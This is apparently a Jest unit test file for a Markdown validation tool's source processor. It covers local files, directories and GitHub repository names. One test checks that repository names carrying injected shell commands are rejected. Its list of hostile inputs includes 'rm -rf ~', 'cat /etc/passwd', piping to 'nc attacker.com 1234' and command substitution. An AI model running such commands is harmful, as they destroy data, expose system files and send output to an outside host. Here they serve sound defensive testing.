/**
 * @unit
 * Unit tests for external validation source processor.
 */
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import { processLocalFile, processLocalDirectory, processGitHubRepo } from '../../../src/validation/source-processor.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Use existing test fixtures
const FIXTURES_DIR = path.join(__dirname, '../../fixtures');
const TEMP_TEST_DIR = path.join(__dirname, '../../tmp/validation-test');

describe('Source processor', () => {
  beforeAll(() => {
    // Create temp directory for tests
    fs.mkdirSync(TEMP_TEST_DIR, { recursive: true });
  });

  afterAll(() => {
    // Clean up temp directory
    if (fs.existsSync(TEMP_TEST_DIR)) {
      fs.rmSync(TEMP_TEST_DIR, { recursive: true, force: true });
    }
  });

  describe('processLocalFile', () => {
    test('test_should_return_result_structure_when_file_exists', async () => {
      // Use existing fixture
      const testFile = path.join(FIXTURES_DIR, 'sentence-case/passing.fixture.md');

      const result = await processLocalFile(testFile, {
        customRules: []
      });

      expect(result).toHaveProperty('path', testFile);
      expect(result).toHaveProperty('type', 'local');
      expect(result).toHaveProperty('violations');
      expect(Array.isArray(result.violations)).toBe(true);
    });

    test('test_should_handle_nonexistent_file_when_path_invalid', async () => {
      await expect(
        processLocalFile('/nonexistent/file.md', { customRules: [] })
      ).rejects.toThrow();
    });
  });

  describe('processLocalDirectory', () => {
    test('test_should_find_markdown_files_when_directory_exists', async () => {
      const results = await processLocalDirectory(FIXTURES_DIR, {
        customRules: [],
        filters: {
          include: ['**/*.md'],
          exclude: ['**/node_modules/**']
        }
      });

      expect(Array.isArray(results)).toBe(true);
      expect(results.length).toBeGreaterThan(0);
      expect(results.every(r => r.type === 'local')).toBe(true);
    });

    test('test_should_apply_filters_when_processing_directory', async () => {
      const results = await processLocalDirectory(FIXTURES_DIR, {
        customRules: [],
        filters: {
          include: ['**/sentence-case/**/*.md'],
          exclude: ['**/node_modules/**']
        }
      });

      expect(Array.isArray(results)).toBe(true);
      // All results should be from sentence-case directory
      expect(results.every(r => r.path.includes('sentence-case'))).toBe(true);
    });
  });

  describe('processGitHubRepo', () => {
    test('test_should_handle_invalid_repo_when_name_malformed', async () => {
      await expect(
        processGitHubRepo('invalid-repo-name', { customRules: [] })
      ).rejects.toThrow(/Invalid repository name/);
    });

    test('test_should_reject_shell_injection_when_repo_name_has_shell_metacharacters', async () => {
      const maliciousRepoNames = [
        'owner/repo && rm -rf ~',
        'owner/repo; cat /etc/passwd',
        'owner/repo | nc attacker.com 1234',
        'owner/repo`whoami`',
        'owner/repo$(whoami)',
        'owner/repo&& malicious-command',
        'owner/repo; malicious-command',
        'owner/repo\nmalicious-command'
      ];

      for (const repoName of maliciousRepoNames) {
        await expect(
          processGitHubRepo(repoName, { customRules: [] })
        ).rejects.toThrow(/Invalid repository name/);
      }
    });

    test('test_should_accept_valid_repo_when_name_has_allowed_characters', async () => {
      // Test that valid repo names with allowed characters would pass validation
      // Note: We're only testing the validation, not actual cloning
      const validRepoNames = [
        'owner/repo',
        'owner-name/repo-name',
        'owner_name/repo_name',
        'owner.name/repo.name',
        'owner123/repo456',
        'my-org/my.repo_123'
      ];

      for (const repoName of validRepoNames) {
        // The function will fail at clone stage, but should pass validation
        // We check that it doesn't throw the validation error
        try {
          await processGitHubRepo(repoName, { customRules: [] });
        } catch (error) {
          // Should fail at clone stage, not validation
          expect(error.message).not.toContain('alphanumeric characters');
        }
      }
    });

    // Skip actual GitHub cloning in unit tests - covered in integration tests
    test.skip('test_should_clone_and_process_when_repo_valid', async () => {
      const results = await processGitHubRepo('owner/repo', {
        customRules: [],
        filters: {
          include: ['**/*.md']
        }
      });

      expect(Array.isArray(results)).toBe(true);
      expect(results.every(r => r.type === 'github')).toBe(true);
    });
  });
});
